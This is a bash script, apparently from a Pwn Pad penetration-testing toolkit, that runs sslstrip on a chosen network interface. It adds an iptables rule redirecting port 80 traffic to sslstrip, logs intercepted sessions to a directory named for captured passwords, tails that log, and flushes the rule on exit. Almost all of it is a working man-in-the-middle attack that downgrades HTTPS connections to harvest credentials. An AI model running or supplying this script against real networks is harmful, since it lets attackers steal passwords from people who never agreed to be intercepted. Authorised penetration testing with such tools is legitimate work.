#!/bin/bash
# SSL strip script for sniffing on available interfaces

trap f_clean_up INT
trap f_clean_up KILL

include_cell=1
. /opt/pwnix/pwnpad-scripts/px_interface_selector.sh

# Cleanup function to ensure sslstrip stops and iptable rules stop
f_clean_up(){
  echo
  echo "[!] Killing other instances of sslstrip and flushing iptables"
  echo
  killall sslstrip

  # Remove SSL Strip iptables rule ONLY
  iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
}

# Setup iptables for sslstrip
f_ip_tables(){
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
}

f_run(){
  # Path to sslstrip definitions
  clear
  echo
  echo "Logs saved to /opt/pwnix/captures/passwords/"
  echo
  sleep 2

  f_interface
  f_ip_tables

  logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log

  sslstrip -pfk -w $logfile  -l 8888 $interface &

  sleep 3
  echo
  echo
  tail -f $logfile
}

f_run
f_clean_up
